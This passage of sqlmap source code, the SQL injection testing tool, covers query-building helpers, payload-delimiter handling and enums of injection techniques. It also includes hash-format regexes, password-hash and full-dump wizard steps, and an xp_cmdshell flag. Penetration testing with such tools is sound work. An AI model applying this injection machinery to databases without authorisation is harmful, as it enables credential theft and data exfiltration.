select:\n            lengthExpr = expression.replace(fieldsStr, lengthQuery % fieldsStr, 1)\n        else:\n            lengthExpr = lengthQuery % expression\n\n        return unescaper.escape(lengthExpr)\n\n    def forgeCaseStatement(self, expression):\n        \"\"\"\n        Take in input a query string and return its CASE statement query\n        string.\n\n        Example:\n\n        Input:  (SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'\n        Output: SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y') THEN 1 ELSE 0 END)\n\n        @param expression: expression to be processed\n        @type num: C{str}\n\n        @return: processed expression\n        @rtype: C{str}\n        \"\"\"\n\n        caseExpression = expression\n\n        if Backend.getIdentifiedDbms() is not None:\n            caseExpression = queries[Backend.getIdentifiedDbms()].case.query % expression\n\n            if \"(IIF\" not in caseExpression and Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not caseExpression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]):\n                caseExpression += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]\n\n        return caseExpression\n\n    def addPayloadDelimiters(self, value):\n        \"\"\"\n        Adds payload delimiters around the input string\n        \"\"\"\n\n        return \"%s%s%s\" % (PAYLOAD_DELIMITER, value, PAYLOAD_DELIMITER) if value else value\n\n    def removePayloadDelimiters(self, value):\n        \"\"\"\n        Removes payload delimiters from inside the input string\n        \"\"\"\n\n        return value.replace(PAYLOAD_DELIMITER, \"\") if value else value\n\n    def extractPayload(self, value):\n        \"\"\"\n        Extracts payload from inside of the input string\n        \"\"\"\n\n        _ = re.escape(PAYLOAD_DELIMITER)\n        return extractRegexResult(r\"(?s)%s(?P<result>.*?)%s\" % (_, _), value)\n\n    def replacePayload(self, value, payload):\n        \"\"\"\n        Replaces payload inside the input string with a given payload\n        \"\"\"\n\n        _ = re.escape(PAYLOAD_DELIMITER)\n        return re.sub(r\"(?s)(%s.*?%s)\" % (_, _), (\"%s%s%s\" % (PAYLOAD_DELIMITER, getUnicode(payload), PAYLOAD_DELIMITER)).replace(\"\\\\\", r\"\\\\\"), value) if value else value\n\n    def runAsDBMSUser(self, query):\n        if conf.dbmsCred and \"Ad Hoc Distributed Queries\" not in query:\n            query = getSQLSnippet(DBMS.MSSQL, \"run_statement_as_user\", USER=conf.dbmsUsername, PASSWORD=conf.dbmsPassword, STATEMENT=query.replace(\"'\", \"''\"))\n\n        return query\n\n    def whereQuery(self, query):\n        if conf.dumpWhere and query:\n            if Backend.isDbms(DBMS.ORACLE) and re.search(r\"qq ORDER BY \\w+\\)\", query, re.I) is not None:\n                prefix, suffix = re.sub(r\"(?i)(qq)( ORDER BY \\w+\\))\", r\"\\g<1> WHERE %s\\g<2>\" % conf.dumpWhere, query), \"\"\n            else:\n                match = re.search(r\" (LIMIT|ORDER).+\", query, re.I)\n                if match:\n                    suffix = match.group(0)\n                    prefix = query[:-len(suffix)]\n                else:\n                    prefix, suffix = query, \"\"\n\n            if conf.tbl and \"%s)\" % conf.tbl.upper() in prefix.upper():\n                prefix = re.sub(r\"(?i)%s\\)\" % re.escape(conf.tbl), \"%s WHERE %s)\" % (conf.tbl, conf.dumpWhere), prefix)\n            elif re.search(r\"(?i)\\bWHERE\\b\", prefix):\n                prefix += \" AND %s\" % conf.dumpWhere\n            else:\n                prefix += \" WHERE %s\" % conf.dumpWhere\n\n            query = prefix\n            if suffix and not all(re.search(r\"ORDER BY\", _, re.I) is not None for _ in (query, suffix)):\n                query += suffix\n\n        return query\n\n# SQL agent\nagent = Agent()\n", "lib/core/enums.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nclass PRIORITY(object):\n    LOWEST = -100\n    LOWER = -50\n    LOW = -10\n    NORMAL = 0\n    HIGH = 10\n    HIGHER = 50\n    HIGHEST = 100\n\nclass SORT_ORDER(object):\n    FIRST = 0\n    SECOND = 1\n    THIRD = 2\n    FOURTH = 3\n    FIFTH = 4\n    LAST = 100\n\n# Reference: https://docs.python.org/2/library/logging.html#logging-levels\nclass LOGGING_LEVELS(object):\n    NOTSET = 0\n    DEBUG = 10\n    INFO = 20\n    WARNING = 30\n    ERROR = 40\n    CRITICAL = 50\n\nclass DBMS(object):\n    ACCESS = \"Microsoft Access\"\n    DB2 = \"IBM DB2\"\n    FIREBIRD = \"Firebird\"\n    MAXDB = \"SAP MaxDB\"\n    MSSQL = \"Microsoft SQL Server\"\n    MYSQL = \"MySQL\"\n    ORACLE = \"Oracle\"\n    PGSQL = \"PostgreSQL\"\n    SQLITE = \"SQLite\"\n    SYBASE = \"Sybase\"\n    INFORMIX = \"Informix\"\n    HSQLDB = \"HSQLDB\"\n    H2 = \"H2\"\n    MONETDB = \"MonetDB\"\n    DERBY = \"Apache Derby\"\n    VERTICA = \"Vertica\"\n    MCKOI = \"Mckoi\"\n    PRESTO = \"Presto\"\n    ALTIBASE = \"Altibase\"\n    MIMERSQL = \"MimerSQL\"\n    CLICKHOUSE = \"ClickHouse\"\n    CRATEDB = \"CrateDB\"\n    CUBRID = \"Cubrid\"\n    CACHE = \"InterSystems Cache\"\n    EXTREMEDB = \"eXtremeDB\"\n    FRONTBASE = \"FrontBase\"\n    RAIMA = \"Raima Database Manager\"\n    VIRTUOSO = \"Virtuoso\"\n\nclass DBMS_DIRECTORY_NAME(object):\n    ACCESS = \"access\"\n    DB2 = \"db2\"\n    FIREBIRD = \"firebird\"\n    MAXDB = \"maxdb\"\n    MSSQL = \"mssqlserver\"\n    MYSQL = \"mysql\"\n    ORACLE = \"oracle\"\n    PGSQL = \"postgresql\"\n    SQLITE = \"sqlite\"\n    SYBASE = \"sybase\"\n    HSQLDB = \"hsqldb\"\n    H2 = \"h2\"\n    INFORMIX = \"informix\"\n    MONETDB = \"monetdb\"\n    DERBY = \"derby\"\n    VERTICA = \"vertica\"\n    MCKOI = \"mckoi\"\n    PRESTO = \"presto\"\n    ALTIBASE = \"altibase\"\n    MIMERSQL = \"mimersql\"\n    CLICKHOUSE = \"clickhouse\"\n    CRATEDB = \"cratedb\"\n    CUBRID = \"cubrid\"\n    CACHE = \"cache\"\n    EXTREMEDB = \"extremedb\"\n    FRONTBASE = \"frontbase\"\n    RAIMA = \"raima\"\n    VIRTUOSO = \"virtuoso\"\n\nclass FORK(object):\n    MARIADB = \"MariaDB\"\n    MEMSQL = \"MemSQL\"\n    PERCONA = \"Percona\"\n    COCKROACHDB = \"CockroachDB\"\n    TIDB = \"TiDB\"\n    REDSHIFT = \"Amazon Redshift\"\n    GREENPLUM = \"Greenplum\"\n    DRIZZLE = \"Drizzle\"\n    IGNITE = \"Apache Ignite\"\n    AURORA = \"Aurora\"\n    ENTERPRISEDB = \"EnterpriseDB\"\n    YELLOWBRICK = \"Yellowbrick\"\n    IRIS = \"Iris\"\n    YUGABYTEDB = \"YugabyteDB\"\n    OPENGAUSS = \"OpenGauss\"\n\nclass CUSTOM_LOGGING(object):\n    PAYLOAD = 9\n    TRAFFIC_OUT = 8\n    TRAFFIC_IN = 7\n\nclass OS(object):\n    LINUX = \"Linux\"\n    WINDOWS = \"Windows\"\n\nclass PLACE(object):\n    GET = \"GET\"\n    POST = \"POST\"\n    URI = \"URI\"\n    COOKIE = \"Cookie\"\n    USER_AGENT = \"User-Agent\"\n    REFERER = \"Referer\"\n    HOST = \"Host\"\n    CUSTOM_POST = \"(custom) POST\"\n    CUSTOM_HEADER = \"(custom) HEADER\"\n\nclass POST_HINT(object):\n    SOAP = \"SOAP\"\n    JSON = \"JSON\"\n    JSON_LIKE = \"JSON-like\"\n    MULTIPART = \"MULTIPART\"\n    XML = \"XML (generic)\"\n    ARRAY_LIKE = \"Array-like\"\n\nclass HTTPMETHOD(object):\n    GET = \"GET\"\n    POST = \"POST\"\n    HEAD = \"HEAD\"\n    PUT = \"PUT\"\n    DELETE = \"DELETE\"\n    TRACE = \"TRACE\"\n    OPTIONS = \"OPTIONS\"\n    CONNECT = \"CONNECT\"\n    PATCH = \"PATCH\"\n\nclass NULLCONNECTION(object):\n    HEAD = \"HEAD\"\n    RANGE = \"Range\"\n    SKIP_READ = \"skip-read\"\n\nclass REFLECTIVE_COUNTER(object):\n    MISS = \"MISS\"\n    HIT = \"HIT\"\n\nclass CHARSET_TYPE(object):\n    BINARY = 1\n    DIGITS = 2\n    HEXADECIMAL = 3\n    ALPHA = 4\n    ALPHANUM = 5\n\nclass HEURISTIC_TEST(object):\n    CASTED = 1\n    NEGATIVE = 2\n    POSITIVE = 3\n\nclass HASH(object):\n    MYSQL = r'(?i)\\A\\*[0-9a-f]{40}\\Z'\n    MYSQL_OLD = r'(?i)\\A(?![0-9]+\\Z)[0-9a-f]{16}\\Z'\n    POSTGRES = r'(?i)\\Amd5[0-9a-f]{32}\\Z'\n    MSSQL = r'(?i)\\A0x0100[0-9a-f]{8}[0-9a-f]{40}\\Z'\n    MSSQL_OLD = r'(?i)\\A0x0100[0-9a-f]{8}[0-9a-f]{80}\\Z'\n    MSSQL_NEW = r'(?i)\\A0x0200[0-9a-f]{8}[0-9a-f]{128}\\Z'\n    ORACLE = r'(?i)\\As:[0-9a-f]{60}\\Z'\n    ORACLE_OLD = r'(?i)\\A[0-9a-f]{16}\\Z'\n    MD5_GENERIC = r'(?i)\\A(0x)?[0-9a-f]{32}\\Z'\n    SHA1_GENERIC = r'(?i)\\A(0x)?[0-9a-f]{40}\\Z'\n    SHA224_GENERIC = r'(?i)\\A[0-9a-f]{56}\\Z'\n    SHA256_GENERIC = r'(?i)\\A(0x)?[0-9a-f]{64}\\Z'\n    SHA384_GENERIC = r'(?i)\\A[0-9a-f]{96}\\Z'\n    SHA512_GENERIC = r'(?i)\\A(0x)?[0-9a-f]{128}\\Z'\n    CRYPT_GENERIC = r'\\A(?!\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\Z)(?![0-9]+\\Z)[./0-9A-Za-z]{13}\\Z'\n    JOOMLA = r'\\A[0-9a-f]{32}:\\w{32}\\Z'\n    PHPASS = r'\\A\\$[PHQS]\\$[./0-9a-zA-Z]{31}\\Z'\n    APACHE_MD5_CRYPT = r'\\A\\$apr1\\$.{1,8}\\$[./a-zA-Z0-9]+\\Z'\n    UNIX_MD5_CRYPT = r'\\A\\$1\\$.{1,8}\\$[./a-zA-Z0-9]+\\Z'\n    APACHE_SHA1 = r'\\A\\{SHA\\}[a-zA-Z0-9+/]+={0,2}\\Z'\n    VBULLETIN = r'\\A[0-9a-fA-F]{32}:.{30}\\Z'\n    VBULLETIN_OLD = r'\\A[0-9a-fA-F]{32}:.{3}\\Z'\n    SSHA = r'\\A\\{SSHA\\}[a-zA-Z0-9+/]+={0,2}\\Z'\n    SSHA256 = r'\\A\\{SSHA256\\}[a-zA-Z0-9+/]+={0,2}\\Z'\n    SSHA512 = r'\\A\\{SSHA512\\}[a-zA-Z0-9+/]+={0,2}\\Z'\n    DJANGO_MD5 = r'\\Amd5\\$[^$]+\\$[0-9a-f]{32}\\Z'\n    DJANGO_SHA1 = r'\\Asha1\\$[^$]+\\$[0-9a-f]{40}\\Z'\n    MD5_BASE64 = r'\\A[a-zA-Z0-9+/]{22}==\\Z'\n    SHA1_BASE64 = r'\\A[a-zA-Z0-9+/]{27}=\\Z'\n    SHA256_BASE64 = r'\\A[a-zA-Z0-9+/]{43}=\\Z'\n    SHA512_BASE64 = r'\\A[a-zA-Z0-9+/]{86}==\\Z'\n\n# Reference: http://www.zytrax.com/tech/web/mobile_ids.html\nclass MOBILES(object):\n    BLACKBERRY = (\"BlackBerry Z10\", \"Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+\")\n    GALAXY = (\"Samsung Galaxy S8\", \"Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP\")\n    HP = (\"HP iPAQ 6365\", \"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; HP iPAQ h6300)\")\n    HTC = (\"HTC 10\", \"Mozilla/5.0 (Linux; Android 8.0.0; HTC 10 Build/OPR1.170623.027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36\")\n    HUAWEI = (\"Huawei P8\", \"Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI H891L Build/HuaweiH891L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\")\n    IPHONE = (\"Apple iPhone 8\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\")\n    LUMIA = (\"Microsoft Lumia 950\", \"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15063\")\n    NEXUS = (\"Google Nexus 7\", \"Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19\")\n    NOKIA = (\"Nokia N97\", \"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344\")\n    PIXEL = (\"Google Pixel\", \"Mozilla/5.0 (Linux; Android 10; Pixel) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.117 Mobile Safari/537.36\")\n    XIAOMI = (\"Xiaomi Mi 8 Pro\", \"Mozilla/5.0 (Linux; Android 9; MI 8 Pro Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36\")\n\nclass PROXY_TYPE(object):\n    HTTP = \"HTTP\"\n    HTTPS = \"HTTPS\"\n    SOCKS4 = \"SOCKS4\"\n    SOCKS5 = \"SOCKS5\"\n\nclass REGISTRY_OPERATION(object):\n    READ = \"read\"\n    ADD = \"add\"\n    DELETE = \"delete\"\n\nclass DUMP_FORMAT(object):\n    CSV = \"CSV\"\n    HTML = \"HTML\"\n    SQLITE = \"SQLITE\"\n\nclass HTTP_HEADER(object):\n    ACCEPT = \"Accept\"\n    ACCEPT_CHARSET = \"Accept-Charset\"\n    ACCEPT_ENCODING = \"Accept-Encoding\"\n    ACCEPT_LANGUAGE = \"Accept-Language\"\n    AUTHORIZATION = \"Authorization\"\n    CACHE_CONTROL = \"Cache-Control\"\n    CONNECTION = \"Connection\"\n    CONTENT_ENCODING = \"Content-Encoding\"\n    CONTENT_LENGTH = \"Content-Length\"\n    CONTENT_RANGE = \"Content-Range\"\n    CONTENT_TYPE = \"Content-Type\"\n    COOKIE = \"Cookie\"\n    EXPIRES = \"Expires\"\n    HOST = \"Host\"\n    IF_MODIFIED_SINCE = \"If-Modified-Since\"\n    IF_NONE_MATCH = \"If-None-Match\"\n    LAST_MODIFIED = \"Last-Modified\"\n    LOCATION = \"Location\"\n    PRAGMA = \"Pragma\"\n    PROXY_AUTHORIZATION = \"Proxy-Authorization\"\n    PROXY_CONNECTION = \"Proxy-Connection\"\n    RANGE = \"Range\"\n    REFERER = \"Referer\"\n    REFRESH = \"Refresh\"  # Reference: http://stackoverflow.com/a/283794\n    SERVER = \"Server\"\n    SET_COOKIE = \"Set-Cookie\"\n    TRANSFER_ENCODING = \"Transfer-Encoding\"\n    URI = \"URI\"\n    USER_AGENT = \"User-Agent\"\n    VIA = \"Via\"\n    X_POWERED_BY = \"X-Powered-By\"\n    X_DATA_ORIGIN = \"X-Data-Origin\"\n\nclass EXPECTED(object):\n    BOOL = \"bool\"\n    INT = \"int\"\n\nclass OPTION_TYPE(object):\n    BOOLEAN = \"boolean\"\n    INTEGER = \"integer\"\n    FLOAT = \"float\"\n    STRING = \"string\"\n\nclass HASHDB_KEYS(object):\n    DBMS = \"DBMS\"\n    DBMS_FORK = \"DBMS_FORK\"\n    CHECK_WAF_RESULT = \"CHECK_WAF_RESULT\"\n    CHECK_NULL_CONNECTION_RESULT = \"CHECK_NULL_CONNECTION_RESULT\"\n    CONF_TMP_PATH = \"CONF_TMP_PATH\"\n    KB_ABS_FILE_PATHS = \"KB_ABS_FILE_PATHS\"\n    KB_BRUTE_COLUMNS = \"KB_BRUTE_COLUMNS\"\n    KB_BRUTE_TABLES = \"KB_BRUTE_TABLES\"\n    KB_CHARS = \"KB_CHARS\"\n    KB_DYNAMIC_MARKINGS = \"KB_DYNAMIC_MARKINGS\"\n    KB_INJECTIONS = \"KB_INJECTIONS\"\n    KB_ERROR_CHUNK_LENGTH = \"KB_ERROR_CHUNK_LENGTH\"\n    KB_XP_CMDSHELL_AVAILABLE = \"KB_XP_CMDSHELL_AVAILABLE\"\n    OS = \"OS\"\n\nclass REDIRECTION(object):\n    YES = 'Y'\n    NO = 'N'\n\nclass PAYLOAD(object):\n    SQLINJECTION = {\n        1: \"boolean-based blind\",\n        2: \"error-based\",\n        3: \"inline query\",\n        4: \"stacked queries\",\n        5: \"time-based blind\",\n        6: \"UNION query\",\n    }\n\n    PARAMETER = {\n        1: \"Unescaped numeric\",\n        2: \"Single quoted string\",\n        3: \"LIKE single quoted string\",\n        4: \"Double quoted string\",\n        5: \"LIKE double quoted string\",\n        6: \"Identifier (e.g. column name)\",\n    }\n\n    RISK = {\n        0: \"No risk\",\n        1: \"Low risk\",\n        2: \"Medium risk\",\n        3: \"High risk\",\n    }\n\n    CLAUSE = {\n        0: \"Always\",\n        1: \"WHERE\",\n        2: \"GROUP BY\",\n        3: \"ORDER BY\",\n        4: \"LIMIT\",\n        5: \"OFFSET\",\n        6: \"TOP\",\n        7: \"Table name\",\n        8: \"Column name\",\n        9: \"Pre-WHERE (non-query)\",\n    }\n\n    class METHOD(object):\n        COMPARISON = \"comparison\"\n        GREP = \"grep\"\n        TIME = \"time\"\n        UNION = \"union\"\n\n    class TECHNIQUE(object):\n        BOOLEAN = 1\n        ERROR = 2\n        QUERY = 3\n        STACKED = 4\n        TIME = 5\n        UNION = 6\n\n    class WHERE(object):\n        ORIGINAL = 1\n        NEGATIVE = 2\n        REPLACE = 3\n\nclass WIZARD(object):\n    BASIC = (\"getBanner\", \"getCurrentUser\", \"getCurrentDb\", \"isDba\")\n    INTERMEDIATE = (\"getBanner\", \"getCurrentUser\", \"getCurrentDb\", \"isDba\", \"getUsers\", \"getDbs\", \"getTables\", \"getSchema\", \"excludeSysDbs\")\n    ALL = (\"getBanner\", \"getCurrentUser\", \"getCurrentDb\", \"isDba\", \"getHostname\", \"getUsers\", \"getPasswordHashes\", \"getPrivileges\", \"getRoles\", \"dumpAll\")\n\nclass ADJUST_TIME_DELAY(object):\n    DISABLE = -1\n    NO = 0\n    YES = 1\n\nclass WEB_PLATFORM(object):\n    PHP = \"php\"\n    ASP = \"asp\"\n    ASPX = \"aspx\"\n    JSP = \"jsp\"\n\nclass CONTENT_TYPE(object):\n    TARGET = 0\n    TECHNIQUES = 1\n    DBMS_FINGERPRINT = 2\n    BANNER = 3\n    CURRENT_USER = 4\n    CURRENT_DB = 5\n    HOSTNAME = 6\n    IS_DBA = 7\n    USERS = 8\n    PASSWORDS = 9\n    PRIVILEGES = 10\n    ROLES = 11\n    DBS = 12\n    TABLES = 13\n    COLUMNS = 14\n    SCHEMA = 15\n    COUNT = 16\n    DUMP_TABLE = 17\n    SEARCH = 18\n    SQL_QUERY = 19\n    COMMON_TABLES = 20\n    COMMON_COLUMNS = 21\n    FILE_READ = 22\n    FILE_WRITE = 23\n    OS_CMD = 24\n    REG_READ = 25\n    STATEMENTS = 26\n\nclass CONTENT_STATUS(object):\n    IN_PROGRESS = 0\n    COMPLETE = 1\n\nclass AUTH_TYPE(object):\n    BASIC = \"basic\"\n    DIGEST = \"digest\"\n    BEARER = \"bearer\"\n    NTLM = \"ntlm\"\n    PKI = \"pki\"\n\nclass AUTOCOMPLETE_TYPE(object):\n    SQL = 0\n    OS = 1\n    SQLMAP = 2\n    API = 3\n\nclass NOTE(object):\n    FALSE_POSITIVE_OR_UNEXPLOITABLE = \"false positive or unexploitable\"\n\nclass MKSTEMP_PREFIX(object):\n    HASHES = \"sqlmaphashes-\"\n    CRAWLER = \"sqlmapcrawler-\"\n    IPC = \"sqlmapipc-\"\n    CONFIG = \"sqlmapconfig-\"\n    TESTING = \"sqlmaptesting-\"\n    RESULTS = \"sqlmapresults-\"\n    COOKIE_JAR = \"sqlmapcookiejar-\"\n    BIG_ARRAY = \"sqlmapbigarray-\"\n    SPECIFIC_RESPONSE = \"sqlmapresponse-\"\n    PREPROCESS = \"sqlmappreprocess-\"\n\nclass TIMEOUT_STATE(object):\n    NORMAL = 0\n    EXCEPTION = 1\n    TIMEOUT = 2\n\nclass HINT(object):\n    PREPEND = 0\n    APPEND = 1\n\nclass FUZZ_UNION_COLUMN:\n    STRING = \"<string>\"\n    INTEGER = \"<integer>\"\n    NULL = \"NULL\"\n\nclass COLOR:\n    BLUE = \"\\033[34m\"\n    BOLD_MAGENTA = \"\\033[35;1m\"\n    BOLD_GREEN = \"\\033[32;1m\"\n    BOLD_LIGHT_MAGENTA = \"\\033[95;1m\"\n    LIGHT_GRAY = \"\\033[37m\"\n    BOLD_RED = \"\\033[31;1m\"\n    BOLD_LIGHT_GRAY = \"\\033[37;1m\"\n    YELLOW = \"\\033[33m\"\n    DARK_GRAY = \"\\033[90m\"\n    BOLD_CYAN = \"\\033[36;1m\"\n    LIGHT_RED = \"\\033[91m\"\n    CYAN = \"\\033[36m\"\n    MAGENTA = \"\\033[35m\"\n    LIGHT_MAGENTA = \"\\033[95m\"\n    LIGHT_GREEN = \"\\033[92m\"\n    RESET = \"\\033[0m\"\n    BOLD_DARK_GRAY = \"\\033[90;1m\"\n    BOLD_LIGHT_YELLOW = \"\\033[93;1m\"\n    BOLD_LIGHT_RED = \"\\033[91;1m\"\n    BOLD_LIGHT_GREEN = \"\\033[92;1m\"\n    LIGHT_YELLOW = \"\\033[93m\"\n    BOLD_LIGHT_BLUE = \"\\033[94;1m\"\n    BOLD_LIGHT_CYAN = \"\\033[96;1m\"\n    LIGHT_BLUE = \"\\033[94m\"\n    BOLD_WHITE = \"\\033[97;1m\"\n    LIGHT_CYAN = \"\\033[96m\"\n    BLACK = \"\\033[30m\"\n    BOLD_YELLOW = \"\\033[33;1m\"\n    BOLD_BLUE = \"\\033[34;1m\"\n    GREEN = \"\\033[32m\"\n    WHITE = \"\\033[97m\"\n    BOLD_BLACK = \"\\033[30;1m\"\n    RED = \"\\033[31m\"\n    UNDERLINE = \"\\033[4m\"\n\nclass BACKGROUND:\n    BLUE = \"\\033[44m\"\n    LIGHT_GRAY = \"\\033[47m\"\n    YELLOW = \"\\033[43m\"\n    DARK_GRAY = \"\\033[100m\"\n    LIGHT_RED = \"\\033[101m\"\n    CYAN = \"\\033[46m\"\n    MAGENTA = \"\\033[45m\"\n    LIGHT_MAGENTA = \"\\033[105m\"\n    LIGHT_GREEN = \"\\033[102m\"\n    RESET = \"\\033[0m\"\n    LIGHT_YELLOW = \"\\033[103m\"\n    LIGHT_BLUE = \"\\033[104m\"\n    LIGHT_CYAN = \"\\033[106m\"\n    BLACK = \"\\033[40m\"\n    GREEN = \"\\033[42m\"\n    WHITE = \"\\033[107m\"\n    RED = \"\\033[41m\"\n", "lib/core/subprocessng.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport errno\nimport os\nimport subprocess\nimport time\n\nfrom lib.core.compat import buffer\nfrom lib.core.convert import getBytes\nfrom lib.core.settings import IS_WIN\n\nif IS_WIN:\n    try:\n        from win32file import ReadFile, WriteFile\n        from win32pipe import PeekNamedPipe\n    except ImportError:\n        pass\n    import msvcrt\nelse:\n    import select\n    import fcntl\n\ndef blockingReadFromFD(fd):\n    # Quick twist around original Twisted function\n    # Blocking read from a non-blocking file descriptor\n    output = b\"\"\n\n    while True:\n        try:\n            output += os.read(fd, 8192)\n        except (OSError, IOError) as ioe:\n            if ioe.args[0] in (errno.EAGAIN, errno.EINTR):\n                # Uncomment the following line if the process seems to\n                # take a huge amount of cpu time\n                # time.sleep(0.01)\n                continue\n            else:\n                raise\n        break\n\n    if not output:\n        raise EOFError(\"fd %s has been closed.\" % fd)\n\n    return output\n\ndef blockingWriteToFD(fd, data):\n    # Another quick twist\n    while True:\n        try:\n            data_length = len(data)\n            wrote_data = os.write(fd, data)\n        except (OSError, IOError) as io:\n            if io.errno in (errno.EAGAIN, errno.EINTR):\n                continue\n            else:\n                raise\n\n        if wrote_data < data_length:\n            blockingWriteToFD(fd, data[wrote_data:])\n\n        break\n\n# the following code is taken from http://code.activestate.com/recipes/440554-module-to-allow-asynchronous-subprocess-use-on-win/\nclass Popen(subprocess.Popen):\n    def recv(self, maxsize=None):\n        return self._recv('stdout', maxsize)\n\n    def recv_err(self, maxsize=None):\n        return self._recv('stderr', maxsize)\n\n    def send_recv(self, input='', maxsize=None):\n        return self.send(input), self.recv(maxsize), self.recv_err(maxsize)\n\n    def get_conn_maxsize(self, which, maxsize):\n        if maxsize is None:\n            maxsize = 1024\n        elif maxsize < 1:\n            maxsize = 1\n        return getattr(self, which), maxsize\n\n    def _close(self, which):\n        getattr(self, which).close()\n        setattr(self, which, None)\n\n    if IS_WIN:\n        def send(self, input):\n            if not self.stdin:\n                return None\n\n            try:\n                x = msvcrt.get_osfhandle(self.stdin.fileno())\n                (_, written) = WriteFile(x, input)\n            except ValueError:\n                return self._close('stdin')\n            except Exception as ex:\n                if getattr(ex, \"args\", None) and ex.args[0] in (109, errno.ESHUTDOWN):\n                    return self._close('stdin')\n                raise\n\n            return written\n\n        def _recv(self, which, maxsize):\n            conn, maxsize = self.get_conn_maxsize(which, maxsize)\n            if conn is None:\n                return None\n\n            try:\n                x = msvcrt.get_osfhandle(conn.fileno())\n                (read, nAvail, _) = PeekNamedPipe(x, 0)\n                if maxsize < nAvail:\n                    nAvail = maxsize\n                if nAvail > 0:\n                    (_, read) = ReadFile(x, nAvail, None)\n            except (ValueError, NameError):\n                return self._close(which)\n            except Exception as ex:\n                if getattr(ex, \"args\", None) and ex.args[0] in (109, errno.ESHUTDOWN):\n                    return self._close(which)\n                raise\n\n            if self.universal_newlines:\n                read = self._translate_newlines(read)\n            return read\n    else:\n        def send(self, input):\n            if not self.stdin:\n                return None\n\n            if not select.select([], [self.stdin], [], 0)[1]:\n                return 0\n\n            try:\n                written = os.write(self.stdin.fileno(), input)\n            except OSError as ex:\n                if ex.args[0] == errno.EPIPE:  # broken pipe\n                    return self._close('stdin')\n                raise\n\n            return written\n\n        def _recv(self, which, maxsize):\n            conn, maxsize = self.get_conn_maxsize(which, maxsize)\n            if conn is None:\n                return None\n\n            flags = fcntl.fcntl(conn, fcntl.F_GETFL)\n            if not conn.closed:\n                fcntl.fcntl(conn, fcntl.F_SETFL, flags | os.O_NONBLOCK)\n\n            try:\n                if not select.select([conn], [], [], 0)[0]:\n                    return ''\n\n                r = conn.read(maxsize)\n                if not r:\n                    return self._close(which)\n\n                if self.universal_newlines:\n                    r = self._translate_newlines(r)\n                return r\n            finally:\n                if not conn.closed:\n                    fcntl.fcntl(conn, fcntl.F_SETFL, flags)\n\ndef recv_some(p, t=.1, e=1, tr=5, stderr=0):\n    if tr < 1:\n        tr = 1\n    x = time.time() + t\n    y = []\n    r = ''\n    if stderr:\n        pr = p.recv_err\n    else:\n        pr = p.recv\n    while time.time() < x or r:\n        r = pr()\n        if r is None:\n            break\n        elif r:\n            y.append(r)\n        else:\n            time.sleep(max((x - time.time()) / tr, 0))\n    return b''.join(y)\n\ndef send_all(p, data):\n    if not data:\n        return\n\n    data = getBytes(data)\n\n    while len(data):\n        sent = p.send(data)\n        if not isinstance(sent, int):\n            break\n        data = buffer(data[sent:])\n", "lib/core/dump.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport hashlib\nimport os\nimport re\nimport shutil\nimport tempfile\nimport threading\n\nfrom lib.core.common import Backend\nfrom lib.core.common import checkFile\nfrom lib.core.common import dataToDumpFile\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import filterNone\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import isListLike\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import normalizeUnicode\nfrom lib.core.common import openFile\nfrom lib.core.common import prioritySortColumns\nfrom lib.core.common import randomInt\nfrom lib.core.common import safeCSValue\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getConsoleLength\nfrom lib.core.convert import getText\nfrom lib.core.convert import getUnicode\nfrom lib.core.convert import htmlEscape\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.dicts import DUMP_REPLACEMENTS\nfrom lib.core.enums import CONTENT_STATUS\nfrom lib.core.enums import CONTENT_TYPE\nfrom lib.core.enums import DBMS\nfrom 